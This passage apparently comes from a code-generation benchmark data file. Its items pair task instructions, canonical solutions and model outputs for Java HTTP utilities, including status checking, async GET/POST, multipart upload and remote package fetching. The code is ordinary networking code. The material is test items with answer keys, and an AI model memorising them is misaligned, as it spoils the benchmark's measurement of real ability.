{\n                connection.setRequestProperty(parts[0].trim(), parts[1].trim());\n            }\n        }\n        return connection;\n    }\n\n    private static String parseInputStreamAndClose(InputStream inputStream) throws IOException {\n        StringBuilder result = new StringBuilder();\n        try (BufferedReader reader = new BufferedReader(new InputStreamReader(inputStream))) {\n            int c;\n            while ((c = reader.read()) != -1) {\n                result.append((char) c);\n            }\n        } finally {\n            if (inputStream != null) {\n                inputStream.close();\n            }\n        }\n        return result.toString();\n    }\n\n    public static String parseString(HttpURLConnection connection) throws IOException {\n        InputStream inputStream = connection.getInputStream();\n        return parseInputStreamAndClose(inputStream);\n    }\n\n    public static String parseStringAndDisconnect(HttpURLConnection connection) throws IOException {\n        String response = parseString(connection);\n        connection.disconnect();\n        return response;\n    }\n\n    public static String parseErrorString(HttpURLConnection connection) throws IOException {\n        InputStream errorStream = connection.getErrorStream();\n        return errorStream != null ? parseInputStreamAndClose(errorStream) : \"\";\n    }\n\n    public static String parseErrorStringAndDisconnect(HttpURLConnection connection) throws IOException {\n        String errorResponse = parseErrorString(connection);\n        connection.disconnect();\n        return errorResponse;\n    }\n\n    public static JSONObject parseJSONObject(HttpURLConnection connection) throws IOException {\n        String response = parseString(connection);\n        return new JSONObject(response);\n    }\n\n    public static JSONObject parseJSONObjectAndDisconnect(HttpURLConnection connection) throws IOException {\n        JSONObject response = parseJSONObject(connection);\n        connection.disconnect();\n        return response;\n    }\n\n    public static JSONArray parseJSONArray(HttpURLConnection connection) throws IOException {\n        String response = parseString(connection);\n        return new JSONArray(response);\n    }\n\n    public static JSONArray parseJSONArrayAndDisconnect(HttpURLConnection connection) throws IOException {\n        JSONArray response = parseJSONArray(connection);\n        connection.disconnect();\n        return response;\n    }\n}\n```"
  },
  {
    "Task_id": 89,
    "Instruction": "Task Description: Create a Java class that checks the HTTP status of a given URL and provides information about the response code and any redirection.\n\nClass Description: The HttpStatusChecker class is responsible for making HTTP requests to a specified URL, checking the response status code, and providing information about the response. It handles redirections and provides human-readable messages for the status codes. The class is designed for Android applications, using Android-specific components for logging and resource management.\n\nAttributes:\n- context: Context - The Android context used for accessing resources and system services.\n- url: String - The URL to be checked for HTTP status.\n\nMethods:\n- checkStatus() -> StatusResult - Performs the HTTP request to the specified URL, checks the response code, handles redirections, and returns a StatusResult object containing the status message and redirection URL (if any). This method handles various exceptions and provides appropriate error messages.\n  \n  Nested Class:\n  - StatusResult - A static inner class that holds the result of the HTTP status check.\n    Attributes:\n    - message: String - A human-readable message describing the HTTP status or error.\n    - redirectionUrl: String - The URL to which the original URL redirects (null if no redirection).",
    "Canonical_solution": "import android.content.Context;\nimport android.util.Log;\n\nimport com.trianguloy.urlchecker.utilities.methods.HttpUtils;\n\nimport java.io.IOException;\nimport java.net.HttpURLConnection;\nimport java.net.URL;\n\npublic class HttpStatusChecker {\n\n    private final Context context;\n    private final String url;\n\n    public HttpStatusChecker(Context context, String url) {\n        this.context = context;\n        this.url = url;\n    }\n\n    public StatusResult checkStatus() {\n        String message = null;\n        String redirectionUrl = null;\n\n        HttpURLConnection conn = null;\n        try {\n            // Step 2: Get the access URL\n            Log.d(\"STATUS\", \"Checking: \" + url);\n            \n            // Step 3: Create an HttpURLConnection object\n            conn = (HttpURLConnection) new URL(url).openConnection();\n            \n            // Step 4: Set request parameters\n            conn.setInstanceFollowRedirects(false);\n            conn.setConnectTimeout(HttpUtils.CONNECT_TIMEOUT);\n            \n            // Step 5: Processing Input and Output\n            var responseCode = conn.getResponseCode();\n            Log.d(\"RESPONSE_CODE\", url + \": \" + responseCode);\n\n            var codesArray = context.getResources().getStringArray(R.array.mStatus_codes);\n            for (var s : codesArray) {\n                if (s.startsWith(String.valueOf(responseCode))) {\n                    message = s;\n                    break;\n                }\n            }\n            if (message == null) {\n                message = context.getString(R.string.mStatus_unknownCode, responseCode);\n            }\n\n            var location = conn.getHeaderField(\"Location\");\n            if (location != null) {\n                redirectionUrl = new URL(new URL(url), location).toExternalForm();\n            }\n        } catch (IOException e) {\n            e.printStackTrace();\n            message = context.getString(R.string.mStatus_ioerror, e.getMessage());\n        } catch (Exception e) {\n            e.printStackTrace();\n            message = context.getString(R.string.mStatus_error, e.getMessage());\n        } finally {\n            // Step 6: Disconnect\n            if (conn != null) {\n                conn.disconnect();\n            }\n        }\n\n        return new StatusResult(message, redirectionUrl);\n    }\n\n    public static class StatusResult {\n        public final String message;\n        public final String redirectionUrl;\n\n        public StatusResult(String message, String redirectionUrl) {\n            this.message = message;\n            this.redirectionUrl = redirectionUrl;\n        }\n    }\n}",
    "Code_level": "Class-level",
    "FSMID_for_test": 16,
    "right_result": "```java\nimport android.content.Context;\nimport android.util.Log;\n\nimport java.io.IOException;\nimport java.net.HttpURLConnection;\nimport java.net.URL;\n\npublic class HttpStatusChecker {\n    private final Context context;\n    private final String url;\n\n    public HttpStatusChecker(Context context, String url) {\n        this.context = context;\n        this.url = url;\n    }\n\n    public StatusResult checkStatus() {\n        HttpURLConnection connection = null;\n        try {\n            URL targetUrl = new URL(url);\n            connection = (HttpURLConnection) targetUrl.openConnection();\n            connection.setInstanceFollowRedirects(false);\n            connection.setRequestMethod(\"GET\");\n            connection.connect();\n\n            int responseCode = connection.getResponseCode();\n            String redirectedUrl = null;\n\n            if (responseCode >= 300 && responseCode < 400) {\n                String locationHeader = connection.getHeaderField(\"Location\");\n                if (locationHeader != null) {\n                    redirectedUrl = locationHeader;\n                }\n            }\n\n            return new StatusResult(getStatusMessage(responseCode), redirectedUrl);\n        } catch (IOException e) {\n            Log.e(context.getClass().getName(), \"Error checking HTTP status: \" + e.getMessage());\n            return new StatusResult(\"An error occurred while checking the URL.\", null);\n        } finally {\n            if (connection != null) {\n                connection.disconnect();\n            }\n        }\n    }\n\n    private String getStatusMessage(int code) {\n        switch (code) {\n            case 200:\n                return \"OK\";\n            case 301:\n                return \"Moved Permanently\";\n            case 302:\n                return \"Found (temporary redirect)\";\n            case 400:\n                return \"Bad Request\";\n            case 404:\n                return \"Not Found\";\n            case 500:\n                return \"Internal Server Error\";\n            default:\n                return \"Unknown status code: \" + code;\n        }\n    }\n\n    public static class StatusResult {\n        public final String message;\n        public final String redirectionUrl;\n\n        public StatusResult(String message, String redirectionUrl) {\n            this.message = message;\n            this.redirectionUrl = redirectionUrl;\n        }\n    }\n}\n```"
  },
  {
    "Task_id": 90,
    "Instruction": "Task Description: Create a Java utility class for making HTTP requests using HttpURLConnection, supporting both GET and POST methods asynchronously, with callback mechanisms for handling responses and errors. The class should also include functionality to retrieve network time from a server.\n\nClass Description: HttpURLConnectionUtils is a utility class that provides asynchronous HTTP request capabilities using Java's HttpURLConnection. It supports GET and POST methods, allows setting custom headers, and provides callback interfaces for handling responses and errors. Additionally, it includes functionality to fetch network time from a specified URL.\n\nAttributes:\n- TAG: String - Class tag for logging purposes\n- TIMEOUT_IN_MILLIONS: int - Default timeout for connections in milliseconds (5000ms)\n- BAIDU_URL: String - Default URL for network time requests (https://www.baidu.com)\n\nMethods:\n- doGetAsync(String urlStr, Callback callback) -> void - Performs an asynchronous GET request to the specified URL and invokes the callback with the response or error\n- doPostAsync(String urlStr, String params, Callback callback) -> void - Performs an asynchronous POST request to the specified URL with given parameters and invokes the callback\n- getNetTime(TimeCallback callback) -> void - Retrieves network time from the default BAIDU_URL using the provided callback\n- getNetTime(String urlStr, TimeCallback callback) -> void - Retrieves network time from the specified URL using the provided callback\n- request(String method, String urlStr, Map<String,String> headers, String params, Callback callback) -> void - Internal method that handles the actual HTTP request logic\n- reqNetTime(String urlStr, TimeCallback callback) -> void - Internal method that handles network time retrieval\n\nCallback Interfaces:\n- Callback: \n  - onResponse(String result, long response) -> void - Called when request succeeds\n  - onFail(Throwable error) -> void - Called when request fails\n- TimeCallback:\n  - onResponse(long millis) -> void - Called when network time retrieval succeeds\n  - onFail(Throwable error) -> void - Called when network time retrieval fails",
    "Canonical_solution": "import java.io.ByteArrayOutputStream;\nimport java.io.InputStream;\nimport java.io.OutputStream;\nimport java.net.HttpURLConnection;\nimport java.net.URL;\nimport java.util.Map;\n\npublic final class HttpURLConnectionUtils {\n\n    private static final String TAG = HttpURLConnectionUtils.class.getSimpleName();\n    private static final int TIMEOUT_IN_MILLIONS = 5000;\n    public static final String BAIDU_URL = \"https://www.baidu.com\";\n\n    public interface Callback {\n        void onResponse(String result, long response);\n        void onFail(Throwable error);\n    }\n\n    public interface TimeCallback {\n        void onResponse(long millis);\n        void onFail(Throwable error);\n    }\n\n    public static void doGetAsync(final String urlStr, final Callback callback) {\n        new Thread(() -> {\n            try {\n                request(\"GET\", urlStr, null, null, callback);\n            } catch (Exception e) {\n                e.printStackTrace();\n            }\n        }).start();\n    }\n\n    public static void doPostAsync(final String urlStr, final String params, final Callback callback) {\n        new Thread(() -> {\n            try {\n                request(\"POST\", urlStr, null, params, callback);\n            } catch (Exception e) {\n                e.printStackTrace();\n            }\n        }).start();\n    }\n\n    public static void getNetTime(final TimeCallback callback) {\n        getNetTime(BAIDU_URL, callback);\n    }\n\n    public static void getNetTime(final String urlStr, final TimeCallback callback) {\n        new Thread(() -> reqNetTime(urlStr, callback)).start();\n    }\n\n    private static void request(\n            final String method,\n            final String urlStr,\n            final Map<String, String> headers,\n            final String params,\n            final Callback callback\n    ) {\n        HttpURLConnection connection = null;\n        InputStream is = null;\n        ByteArrayOutputStream baos = null;\n        try {\n            URL url = new URL(urlStr);\n            connection = (HttpURLConnection) url.openConnection();\n            connection.setRequestMethod(method);\n            \n            if (headers != null) {\n                for (Map.Entry<String, String> entry : headers.entrySet()) {\n                    connection.setRequestProperty(entry.getKey(), entry.getValue());\n                }\n            }\n            \n            if (params != null && params.length() != 0) {\n                connection.setDoInput(true);\n                connection.setDoOutput(true);\n                connection.setUseCaches(false);\n                OutputStream os = connection.getOutputStream();\n                os.write(params.getBytes());\n                os.flush();\n                os.close();\n            }\n            \n            connection.setConnectTimeout(TIMEOUT_IN_MILLIONS);\n            connection.setReadTimeout(TIMEOUT_IN_MILLIONS);\n            \n            int responseCode = connection.getResponseCode();\n            if (responseCode >= 200 && responseCode < 300) {\n                is = connection.getInputStream();\n                baos = new ByteArrayOutputStream();\n                byte[] buffer = new byte[1024];\n                int len;\n                while (((len = is.read(buffer)) != -1)) {\n                    baos.write(buffer, 0, len);\n                }\n                String result = baos.toString();\n                if (callback != null) {\n                    callback.onResponse(result, connection.getDate());\n                }\n            } else {\n                if (callback != null) {\n                    callback.onFail(new Exception(\"responseCode not >= 200 or < 300, code: \" + responseCode));\n                }\n            }\n        } catch (Exception e) {\n            if (callback != null) {\n                callback.onFail(e);\n            }\n        } finally {\n            try {\n                if (baos != null) baos.close();\n                if (is != null) is.close();\n            } catch (Exception ignore) {}\n            \n            if (connection != null) {\n                try {\n                    connection.disconnect();\n                } catch (Exception ignore) {}\n            }\n        }\n    }\n\n    private static void reqNetTime(final String urlStr, final TimeCallback callback) {\n        HttpURLConnection connection = null;\n        try {\n            URL url = new URL(urlStr);\n            connection = (HttpURLConnection) url.openConnection();\n            long date = connection.getDate();\n            if (date <= 0) {\n                date = -1L;\n            }\n            if (callback != null) {\n                callback.onResponse(date);\n            }\n        } catch (Exception e) {\n            if (callback != null) {\n                callback.onFail(e);\n            }\n        } finally {\n            if (connection != null) {\n                try {\n                    connection.disconnect();\n                } catch (Exception ignore) {}\n            }\n        }\n    }\n}",
    "Code_level": "Class-level",
    "FSMID_for_test": 16,
    "right_result": "```java\nimport java.io.*;\nimport java.net.*;\nimport java.util.Map;\nimport java.util.concurrent.ExecutorService;\nimport java.util.concurrent.Executors;\n\npublic class HttpURLConnectionUtils {\n    public static final String TAG = \"HttpURLConnectionUtils\";\n    public static final int TIMEOUT_IN_MILLIONS = 5000;\n    private static final String BAIDU_URL = \"https://www.baidu.com\";\n    private static final ExecutorService executorService = Executors.newCachedThreadPool();\n\n    public interface Callback {\n        void onResponse(String result, int responseCode);\n        void onFail(Throwable error);\n    }\n\n    public interface TimeCallback {\n        void onResponse(long millis);\n        void onFail(Throwable error);\n    }\n\n    public static void doGetAsync(String urlStr, Callback callback) {\n        request(\"GET\", urlStr, null, null, callback);\n    }\n\n    public static void doPostAsync(String urlStr, String params, Callback callback) {\n        request(\"POST\", urlStr, null, params, callback);\n    }\n\n    public static void getNetTime(TimeCallback callback) {\n        reqNetTime(BAIDU_URL, callback);\n    }\n\n    public static void getNetTime(String urlStr, TimeCallback callback) {\n        reqNetTime(urlStr, callback);\n    }\n\n    private static void request(String method, String urlStr, Map<String, String> headers, String params, Callback callback) {\n        executorService.execute(() -> {\n            HttpURLConnection conn = null;\n            try {\n                URL url = new URL(urlStr);\n                conn = (HttpURLConnection) url.openConnection();\n                conn.setRequestMethod(method);\n                conn.setConnectTimeout(TIMEOUT_IN_MILLIONS);\n                conn.setReadTimeout(TIMEOUT_IN_MILLIONS);\n\n                if (\"POST\".equals(method)) {\n                    conn.setDoOutput(true);\n                    conn.getOutputStream().write(params.getBytes());\n                }\n\n                if (headers != null) {\n                    for (Map.Entry<String, String> entry : headers.entrySet()) {\n                        conn.setRequestProperty(entry.getKey(), entry.getValue());\n                    }\n                }\n\n                int responseCode = conn.getResponseCode();\n                BufferedReader reader = new BufferedReader(new InputStreamReader(conn.getInputStream()));\n                StringBuilder result = new StringBuilder();\n                String line;\n                while ((line = reader.readLine()) != null) {\n                    result.append(line);\n                }\n                callback.onResponse(result.toString(), responseCode);\n            } catch (Exception e) {\n                callback.onFail(e);\n            } finally {\n                if (conn != null) {\n                    conn.disconnect();\n                }\n            }\n        });\n    }\n\n    private static void reqNetTime(String urlStr, TimeCallback callback) {\n        executorService.execute(() -> {\n            HttpURLConnection conn = null;\n            try {\n                URL url = new URL(urlStr);\n                conn = (HttpURLConnection) url.openConnection();\n                conn.setConnectTimeout(TIMEOUT_IN_MILLIONS);\n                conn.setReadTimeout(TIMEOUT_IN_MILLIONS);\n                conn.setRequestMethod(\"GET\");\n\n                long startTime = System.currentTimeMillis();\n                conn.connect();\n                long endTime = System.currentTimeMillis();\n\n                long serverTime = startTime + (endTime - startTime) / 2;\n                callback.onResponse(serverTime);\n            } catch (Exception e) {\n                callback.onFail(e);\n            } finally {\n                if (conn != null) {\n                    conn.disconnect();\n                }\n            }\n        });\n    }\n}\n```"
  },
  {
    "Task_id": 92,
    "Instruction": "Task Description: Create a function that performs an HTTP GET request to a specified URL and returns the response as a string.\n\nFunction Description: The function should establish an HTTP connection to the provided URL, send a GET request, read the response stream, and return the content as a UTF-8 encoded string. It should handle resource cleanup properly by closing all streams and disconnecting the HTTP connection.\n\nInput: \n- requestUrl: String - The URL to which the HTTP GET request will be sent\n\nOutput: \n- String - The response content from the HTTP GET request, or null if an error occurs",
    "Canonical_solution": "import java.io.BufferedReader;\nimport java.io.IOException;\nimport java.io.InputStream;\nimport java.io.InputStreamReader;\nimport java.net.HttpURLConnection;\nimport java.net.URL;\n\nprivate static String httpRequest(String requestUrl) {\n    StringBuffer buffer = null;\n    BufferedReader bufferedReader = null;\n    InputStreamReader inputStreamReader = null;\n    InputStream inputStream = null;\n    HttpURLConnection httpUrlConn = null;\n    try {\n        // \u5efa\u7acbget\u8bf7\u6c42\n        URL url = new URL(requestUrl);\n        httpUrlConn = (HttpURLConnection) url.openConnection();\n        httpUrlConn.setDoInput(true);\n        httpUrlConn.setRequestMethod(\"GET\");\n        // \u83b7\u53d6\u8f93\u5165\u6d41\n        inputStream = httpUrlConn.getInputStream();\n        inputStreamReader = new InputStreamReader(inputStream, \"UTF-8\");\n        bufferedReader = new BufferedReader(inputStreamReader);\n        // \u4ece\u8f93\u5165\u6d41\u83b7\u53d6\u7ed3\u679c\n        buffer = new StringBuffer();\n        String str = null;\n        while ((str = bufferedReader.readLine()) != null) {\n            str = new String(str.getBytes(), \"UTF-8\");\n            buffer.append(str);\n        }\n    } catch (Exception e) {\n        e.printStackTrace();\n    } finally {\n        if (bufferedReader != null) {\n            try {\n                bufferedReader.close();\n            } catch (IOException e) {\n                e.printStackTrace();\n            }\n        }\n        if (inputStreamReader != null) {\n            try {\n                inputStreamReader.close();\n            } catch (IOException e) {\n                e.printStackTrace();\n            }\n        }\n        if (inputStream != null) {\n            try {\n                inputStream.close();\n            } catch (IOException e) {\n                e.printStackTrace();\n            }\n        }\n        if (httpUrlConn != null) {\n            httpUrlConn.disconnect();\n        }\n    }\n    return buffer.toString();\n}",
    "Code_level": "Function-level",
    "FSMID_for_test": 16,
    "right_result": "```java\nimport java.io.BufferedReader;\nimport java.io.InputStreamReader;\nimport java.net.HttpURLConnection;\nimport java.net.URL;\n\npublic class HttpGetRequest {\n\n    public static String performGetRequest(String requestUrl) {\n        StringBuilder response = new StringBuilder();\n        try {\n            URL url = new URL(requestUrl);\n            HttpURLConnection connection = (HttpURLConnection) url.openConnection();\n            connection.setRequestMethod(\"GET\");\n\n            BufferedReader reader = new BufferedReader(new InputStreamReader(connection.getInputStream(), \"UTF-8\"));\n            String line;\n            while ((line = reader.readLine()) != null) {\n                response.append(line);\n            }\n            reader.close();\n            connection.disconnect();\n        } catch (Exception e) {\n            return null;\n        }\n        return response.toString();\n    }\n}\n```"
  },
  {
    "Task_id": 95,
    "Instruction": "Task Description: Create a utility class for handling HTTP POST requests with multipart form data, including both text fields and file uploads, using Java's HttpURLConnection.\n\nClass Description: HttpPostUploadUtil is a utility class designed to simplify the process of sending HTTP POST requests with multipart/form-data content type. It handles both text parameters and file uploads, manages connection timeouts, and properly formats the multipart request body.\n\nAttributes:\n- logger: Logger - Used for logging errors and debug information\n- BOUNDARY: String - A constant string used as the boundary for multipart form data (defined within the method)\n\nMethods:\n- formUpload(String urlStr, int connectTimeout, int readTimeout, Map<String, String> textMap, Map<String, MultipartFile> fileMap) -> String - Performs an HTTP POST request with multipart form data containing both text parameters and files\n  Input:\n    - urlStr: String - The target URL for the POST request\n    - connectTimeout: int - Connection timeout in milliseconds\n    - readTimeout: int - Read timeout in milliseconds\n    - textMap: Map<String, String> - Key-value pairs for text form fields\n    - fileMap: Map<String, MultipartFile> - Key-value pairs for file uploads (key is field name, value is file data)\n  Output:\n    - String - The response body from the server\n\n- closeStream(Closeable closeable) -> void - Helper method to safely close Closeable resources\n  Input:\n    - closeable: Closeable - The resource to be closed\n  Output: None",
    "Canonical_solution": "import org.slf4j.Logger;\nimport org.slf4j.LoggerFactory;\nimport org.springframework.web.multipart.MultipartFile;\nimport java.io.BufferedReader;\nimport java.io.Closeable;\nimport java.io.DataInputStream;\nimport java.io.DataOutputStream;\nimport java.io.IOException;\nimport java.io.InputStreamReader;\nimport java.io.OutputStream;\nimport java.net.HttpURLConnection;\nimport java.net.MalformedURLException;\nimport java.net.ProtocolException;\nimport java.net.URL;\nimport java.util.Iterator;\nimport java.util.Map;\n\npublic class HttpPostUploadUtil {\n\n    private static final Logger logger = LoggerFactory.getLogger(HttpPostUploadUtil.class);\n\n    public static String formUpload(String urlStr, int connectTimeout, int readTimeout, Map<String, String> textMap, Map<String, MultipartFile> fileMap) throws Exception {\n        String res = \"\";\n        HttpURLConnection conn = null;\n        OutputStream out = null;\n        BufferedReader reader = null;\n        String BOUNDARY = \"---------------------------123821742118716\";\n        try {\n            URL url = new URL(urlStr);\n            conn = (HttpURLConnection) url.openConnection();\n            conn.setConnectTimeout(connectTimeout);\n            conn.setReadTimeout(readTimeout);\n            conn.setDoOutput(true);\n            conn.setDoInput(true);\n            conn.setUseCaches(false);\n            conn.setRequestMethod(\"POST\");\n            conn.setRequestProperty(\"Connection\", \"Keep-Alive\");\n            conn.setRequestProperty(\"User-Agent\", \"Mozilla/5.0 (Windows; U; Windows NT 6.1; zh-CN; rv:1.9.2.6)\");\n            conn.setRequestProperty(\"Content-Type\", \"multipart/form-data; boundary=\" + BOUNDARY);\n\n            out = new DataOutputStream(conn.getOutputStream());\n            if (null != textMap) {\n                StringBuffer strBuf = new StringBuffer();\n                Iterator<Map.Entry<String, String>> iter = textMap.entrySet().iterator();\n                while (iter.hasNext()) {\n                    Map.Entry<String, String> entry = iter.next();\n                    String inputName = (String) entry.getKey();\n                    String inputValue = (String) entry.getValue();\n                    if (inputValue == null) {\n                        continue;\n                    }\n                    strBuf.append(\"\\r\\n\").append(\"--\").append(BOUNDARY).append(\"\\r\\n\");\n                    strBuf.append(\"Content-Disposition: form-data; name=\\\"\" + inputName + \"\\\"\\r\\n\\r\\n\");\n                    strBuf.append(inputValue);\n                }\n                out.write(strBuf.toString().getBytes());\n            }\n\n            if (null != fileMap) {\n                Iterator<Map.Entry<String, MultipartFile>> iter = fileMap.entrySet().iterator();\n                while (iter.hasNext()) {\n                    Map.Entry<String, MultipartFile> entry = iter.next();\n                    String inputName = (String) entry.getKey();\n                    MultipartFile multipartFile = (MultipartFile) entry.getValue();\n                    if (multipartFile == null) {\n                        continue;\n                    }\n                    String fileName = multipartFile.getOriginalFilename();\n                    String contentType = multipartFile.getContentType();\n\n                    StringBuffer strBuf = new StringBuffer();\n                    strBuf.append(\"\\r\\n\").append(\"--\").append(BOUNDARY).append(\"\\r\\n\");\n                    strBuf.append(\"Content-Disposition: form-data; name=\\\"\" + inputName + \"\\\"; filename=\\\"\" + fileName + \"\\\"\\r\\n\");\n                    strBuf.append(\"Content-Type:\" + contentType + \"\\r\\n\\r\\n\");\n\n                    out.write(strBuf.toString().getBytes());\n\n                    DataInputStream in = new DataInputStream(multipartFile.getInputStream());\n                    int bytes = 0;\n                    byte[] bufferOut = new byte[1024];\n                    while ((bytes = in.read(bufferOut)) != -1) {\n                        out.write(bufferOut, 0, bytes);\n                    }\n                    in.close();\n                }\n            }\n\n            byte[] endData = (\"\\r\\n--\" + BOUNDARY + \"--\\r\\n\").getBytes();\n            out.write(endData);\n            out.flush();\n\n            StringBuffer strBuf = new StringBuffer();\n            reader = new BufferedReader(new InputStreamReader(conn.getInputStream()));\n            String line = null;\n            while ((line = reader.readLine()) != null) {\n                strBuf.append(line).append(\"\\n\");\n            }\n            res = strBuf.toString();\n        } catch (ProtocolException e) {\n            logger.error(\"\u4e0a\u4f20\u56fe\u7247\u5230\u670d\u52a1\u5668\u5931\u8d25\u2014>ProtocolException\", e);\n            throw new Exception(\"\u56fe\u7247\u670d\u52a1\u5668\u8fde\u63a5\u51fa\u9519\u3002\");\n        } catch (MalformedURLException e) {\n            logger.error(\"\u4e0a\u4f20\u56fe\u7247\u5230\u670d\u52a1\u5668\u5931\u8d25\u2014>MalformedURLException\", e);\n            throw new Exception(\"\u56fe\u7247\u670d\u52a1\u5668\u8fde\u63a5\u51fa\u9519\u3002\");\n        } catch (IOException e) {\n            logger.error(\"\u4e0a\u4f20\u56fe\u7247\u5230\u670d\u52a1\u5668\u5931\u8d25\u2014>IOException\", e);\n            throw new Exception(\"\u56fe\u7247\u670d\u52a1\u5668\u8fde\u63a5\u51fa\u9519\u3002\");\n        } finally {\n            closeStream(out);\n            closeStream(reader);\n            if (null != conn) {\n                conn.disconnect();\n                conn = null;\n            }\n        }\n        return res;\n    }\n\n    private static void closeStream(Closeable closeable){\n        try {\n            if (null != closeable) {\n                closeable.close();\n                closeable = null;\n            }\n        }catch (IOException e) {\n            logger.error(\"\u5173\u95ed\u8d44\u6e90\u51fa\u9519\", e);\n        }\n    }\n}",
    "Code_level": "Class-level",
    "FSMID_for_test": 16,
    "right_result": "```java\nimport java.io.*;\nimport java.net.HttpURLConnection;\nimport java.net.URL;\nimport java.util.Map;\nimport org.apache.commons.logging.Log;\nimport org.apache.commons.logging.LogFactory;\n\npublic class HttpPostUploadUtil {\n    private static final Log logger = LogFactory.getLog(HttpPostUploadUtil.class);\n\n    public static String formUpload(String urlStr, int connectTimeout, int readTimeout,\n                                    Map<String, String> textMap, Map<String, MultipartFile> fileMap) throws IOException {\n        StringBuilder response = new StringBuilder();\n        HttpURLConnection connection = null;\n        OutputStream outputStream = null;\n        PrintWriter writer = null;\n        InputStream inputStream = null;\n\n        try {\n            URL url = new URL(urlStr);\n            connection = (HttpURLConnection) url.openConnection();\n            connection.setConnectTimeout(connectTimeout);\n            connection.setReadTimeout(readTimeout);\n            connection.setDoOutput(true);\n            connection.setDoInput(true);\n            connection.setRequestMethod(\"POST\");\n            connection.setRequestProperty(\"Content-Type\", \"multipart/form-data; boundary=\" + getBoundary());\n\n            outputStream = connection.getOutputStream();\n            writer = new PrintWriter(new OutputStreamWriter(outputStream));\n\n            if (textMap != null) {\n                for (Map.Entry<String, String> entry : textMap.entrySet()) {\n                    writer.append(\"--\").append(getBoundary()).append(\"\\r\\n\");\n                    writer.append(\"Content-Disposition: form-data; name=\\\"\").append(entry.getKey()).append(\"\\\"\\r\\n\\r\\n\");\n                    writer.append(entry.getValue()).append(\"\\r\\n\");\n                    writer.flush();\n                }\n            }\n\n            if (fileMap != null) {\n                for (Map.Entry<String, MultipartFile> entry : fileMap.entrySet()) {\n                    MultipartFile file = entry.getValue();\n                    writer.append(\"--\").append(getBoundary()).append(\"\\r\\n\");\n                    writer.append(\"Content-Disposition: form-data; name=\\\"\").append(entry.getKey())\n                            .append(\"\\\"; filename=\\\"\").append(file.getOriginalFilename()).append(\"\\\"\\r\\n\");\n                    writer.append(\"Content-Type: \").append(file.getContentType()).append(\"\\r\\n\\r\\n\");\n                    writer.flush();\n\n                    try (InputStream fileInputStream = file.getInputStream()) {\n                        byte[] buffer = new byte[4096];\n                        int bytesRead;\n                        while ((bytesRead = fileInputStream.read(buffer)) != -1) {\n                            outputStream.write(buffer, 0, bytesRead);\n                        }\n                    }\n\n                    outputStream.flush();\n                }\n            }\n\n            writer.append(\"--\").append(getBoundary()).append(\"--\\r\\n\");\n            writer.flush();\n\n            int responseCode = connection.getResponseCode();\n            if (responseCode == HttpURLConnection.HTTP_OK) {\n                inputStream = connection.getInputStream();\n                BufferedReader reader = new BufferedReader(new InputStreamReader(inputStream));\n                String line;\n                while ((line = reader.readLine()) != null) {\n                    response.append(line).append(\"\\n\");\n                }\n            } else {\n                logger.error(\"Server returned HTTP code: \" + responseCode);\n            }\n        } finally {\n            closeStream(inputStream);\n            closeStream(writer);\n            closeStream(outputStream);\n            if (connection != null) {\n                connection.disconnect();\n            }\n        }\n\n        return response.toString();\n    }\n\n    private static String getBoundary() {\n        return \"===\" + System.currentTimeMillis() + \"===\";\n    }\n\n    public static void closeStream(Closeable closeable) {\n        if (closeable != null) {\n            try {\n                closeable.close();\n            } catch (IOException e) {\n                logger.error(\"Error closing stream\", e);\n            }\n        }\n    }\n}\n```"
  },
  {
    "Task_id": 97,
    "Instruction": "Task Description: Implement a Java class that provides remote service capabilities for retrieving knowledge packages from a repository server using HTTP communication.\n\nClass Description: RemoteServiceImpl is a service class that handles HTTP communication with a remote repository server to fetch knowledge packages. It manages the connection, request/response handling, and data processing.\n\nAttributes:\n- resporityServerUrl: String - The base URL of the remote repository server\n- log: Logger - Logger instance for logging information and errors\n\nMethods:\n- getKnowledge(String packageId, String timestamp) -> KnowledgePackage - Retrieves a knowledge package from the remote server using the specified package ID and timestamp\n- sendRequest(String packageId, String timestamp) -> String - Internal method that handles the HTTP request/response cycle with the remote server\n- setResporityServerUrl(String resporityServerUrl) -> void - Sets the repository server URL, appending the default endpoint if not present",
    "Canonical_solution": "import java.io.BufferedReader;\nimport java.io.IOException;\nimport java.io.InputStream;\nimport java.io.InputStreamReader;\nimport java.io.OutputStreamWriter;\nimport java.net.HttpURLConnection;\nimport java.net.URL;\nimport java.util.Map;\nimport java.util.logging.Logger;\n\nimport org.apache.commons.lang.StringUtils;\n\nimport com.bstek.urule.RuleException;\nimport com.bstek.urule.Utils;\nimport com.bstek.urule.model.flow.FlowDefinition;\nimport com.bstek.urule.model.rete.JsonUtils;\nimport com.bstek.urule.runtime.KnowledgePackage;\nimport com.bstek.urule.runtime.KnowledgePackageWrapper;\n\npublic class RemoteServiceImpl implements RemoteService {\n    private String resporityServerUrl;\n    private Logger log = Logger.getLogger(RemoteServiceImpl.class.getName());\n\n    public KnowledgePackage getKnowledge(String packageId, String timestamp) {\n        if(StringUtils.isEmpty(resporityServerUrl)){\n            return null;\n        }\n        log.info(\"Load knowledgepackage from remote...\");\n        String content = sendRequest(packageId, timestamp);\n        if(StringUtils.isEmpty(content)){\n            return null;\n        }\n        KnowledgePackageWrapper wrapper = JsonUtils.parseKnowledgePackageWrapper(content);\n        KnowledgePackage knowledgePackage = wrapper.getKnowledgePackage();\n        Map<String, FlowDefinition> flowMap = knowledgePackage.getFlowMap();\n        if(flowMap != null && flowMap.size() > 0){\n            for(FlowDefinition fd : flowMap.values()){\n                fd.buildConnectionToNode();\n            }\n        }\n        return knowledgePackage;\n    }\n\n    private String sendRequest(String packageId, String timestamp) {\n        HttpURLConnection connection = null;\n        OutputStreamWriter writer = null;\n        InputStream inputStream = null;\n        InputStreamReader inputStreamReader = null;\n        BufferedReader bufferedReader = null;\n        try {\n            packageId = Utils.encodeURL(packageId);\n            packageId = Utils.encodeURL(packageId);\n            String content = \"packageId=\" + packageId + \"\";\n            if(StringUtils.isNotEmpty(timestamp)){\n                content += \"&timestamp=\" + timestamp + \"\";\n            }\n            URL url = new URL(resporityServerUrl);\n            connection = (HttpURLConnection)url.openConnection();\n            connection.setRequestMethod(\"POST\");\n            connection.setRequestProperty(\"Accept-Charset\", \"utf-8\");\n            connection.setRequestProperty(\"Content-Type\", \"application/x-www-form-urlencoded\");\n            connection.setRequestProperty(\"Content-Length\", String.valueOf(content.length()));\n            connection.setUseCaches(false);\n            connection.setDoOutput(true);\n            connection.connect();\n            writer = new OutputStreamWriter(connection.getOutputStream());\n            writer.write(content);\n            writer.flush();\n            if (connection.getResponseCode() != 200) {\n                throw new RuleException(\"Server request was failed, Response message : \" + connection.getResponseMessage());\n            }\n            inputStream = connection.getInputStream();\n            inputStreamReader = new 